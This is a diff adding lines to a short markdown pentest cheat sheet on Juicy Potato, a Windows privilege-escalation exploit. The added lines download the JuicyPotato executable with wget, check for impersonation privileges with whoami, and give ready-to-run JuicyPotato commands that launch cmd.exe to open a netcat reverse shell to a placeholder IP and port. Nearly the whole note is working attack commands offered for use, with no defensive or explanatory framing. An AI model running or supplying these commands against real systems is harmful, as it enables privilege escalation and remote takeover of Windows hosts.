@@ -3,6 +3,16 @@ tags: [wpe, windows, exploit]
 ---
 # Juicy Potato
 https://github.com/ohpe/juicy-potato
+wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
 
 #Usage
 juicypotato.exe -l <Port> -t * -p <Programtoexecute> 
+
+# SeImpersonate or SeAssignPrimaryToken
+whoami /all
+
+JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c nc.exe <IP> <PORT> -e c:\windows\system32\cmd.exe" -t *
+JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c nc.exe <IP> <PORT> -e c:\windows\system32\cmd.exe" -t * -c <CLSID>
+
+# CLSID
+https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
